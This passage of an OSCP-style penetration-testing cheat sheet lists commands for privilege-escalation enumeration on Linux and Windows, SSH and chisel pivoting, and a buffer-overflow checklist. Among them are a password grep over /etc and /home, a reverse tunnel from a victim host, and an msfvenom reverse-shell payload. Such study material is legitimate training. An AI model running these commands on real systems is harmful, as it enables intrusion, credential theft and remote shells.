########################################
# 8. PRIVILEGE ESCALATION (IMPORTANT for OSCP)
########################################

##########
# LINUX QUICK ENUM
##########
# Automated
linpeas.sh
linux-smart-enumeration.sh -l 1
sudo -l

# Manual checks
cat /etc/passwd
grep -i 'password' -R /etc /home 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
crontab -l
ls -la /tmp
env

##########
# WORDPRESS QUICK CHECK
##########
wpscan --url http://example.lab --enumerate u,p

##########
# SUDO Priv Esc
##########
# Check GTFOBins
# https://gtfobins.github.io

##########
# Kernel exploits (careful on exam)
##########
uname -r
searchsploit linux kernel | grep <version>

########################################
# 9. WINDOWS PRIV ESC
########################################

# WinPEAS
winpeas.exe

# Enumeration
systeminfo
whoami /priv
ipconfig /all
wmic qfe
dir /a c:\Users
net user
net localgroup administrators

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto"

# DLL Hijacking locations
echo %PATH%

########################################
# 10. PIVOTING & TUNNELING (OSCP MUST KNOW)
########################################

# SSH Local Port Forward
ssh -L 8080:localhost:80 user@$target

# SSH Remote Port Forward
ssh -R 4444:localhost:22 user@$target

# Dynamic SOCKS proxy
ssh -D 9050 user@$target

# Proxychains (edit /etc/proxychains.conf)
proxychains nmap -sT -Pn 127.0.0.1

# Chisel
# Server (attacker):
chisel server -p 9001 --reverse
# Client (victim):
chisel client <LHOST>:9001 R:8000:localhost:80

########################################
# 11. BUFFER OVERFLOW MINI-CHECKLIST (OSCP)
########################################

# Fuzz with Python
# python bof-fuzz.py

# Steps:
# 1. Fuzz input
# 2. Find offset (pattern_create / pattern_offset)
# 3. Confirm EIP control
# 4. Bad chars test
# 5. Find JMP ESP
# 6. Build shellcode (msfvenom)
# 7. Exploit

# Example msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c

########################################
# END
########################################
